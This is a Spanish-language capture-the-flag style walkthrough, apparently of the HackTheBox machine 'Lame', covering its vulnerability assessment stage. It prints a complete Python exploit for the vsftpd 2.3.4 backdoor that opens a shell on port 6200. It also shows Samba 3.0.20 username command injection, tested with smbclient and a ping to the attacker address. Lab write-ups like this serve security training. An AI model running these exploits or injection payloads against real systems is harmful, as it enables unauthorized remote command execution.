## Vulnerability Assessment {-}

### vsftpd 2.3.4 {-}

Miramos si existe un exploit para este servicio.

```bash
searchsploit vsftpd 2.3.4
```

Vemos que hay una vulnerabilidad y que existe un exploit. Como el exploit es une exploit Metasploit, vamos buscando por
la web si existe otro exploit y la encontramos en [cherrera0001 github](https://github.com/cherrera0001/vsftpd_2.3.4_Exploit).

```python
#!/usr/bin/python3
from pwn import log,remote
from sys import argv,exit
from time import sleep

if len(argv) < 2:
    exit(f'Usage: {argv[0]} Target_IP')


p = log.progress("Running")
vsftpd = remote(argv[1], 21)

p.status('Checking Version')
recv = vsftpd.recvuntil(")",timeout=5)
version = (recv.decode()).split(" ")[2].replace(")","")
if version != '2.3.4':
	exit('2.3.4 Version Not Found')

vsftpd.sendline('USER hii:)')
vsftpd.sendline('PASS hello')
p.status('Backdoor Activated')

sleep(3)

backdoor = remote(argv[1], 6200)
p.success("Got Shell!!!")
backdoor.interactive()
```

Si lanzamos el script no funcciona, parece ser que la version a sido parcheada -> rabbithole. 

### SAMBA 3.0.20 {-}

```bash
searchsploit samba 3.0.20
```

Vemos que hay un exploit para Metasploit que permite ejecutar commandos. Examinamos el script con el commando `searchsploit -x 16320` y vemos
que podemos injectar commandos desde el nombre de usuario con el formato siguiente

```ruby
username = "/=`nohup " + payload.encoded + "`"
```

Vamos a por pruebas

1. Nos ponemos en escucha de trazas ICMP

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. Intentamos enviar commandos siguiendo la guia del script

    ```bash
    smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c "dir"
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1"
    smb: \> logon "/='nohup ping -c 1 10.10.14.7'"
    ```

Vemos que esto functionna perfectamente. Vamos a ganar accesso al systema.
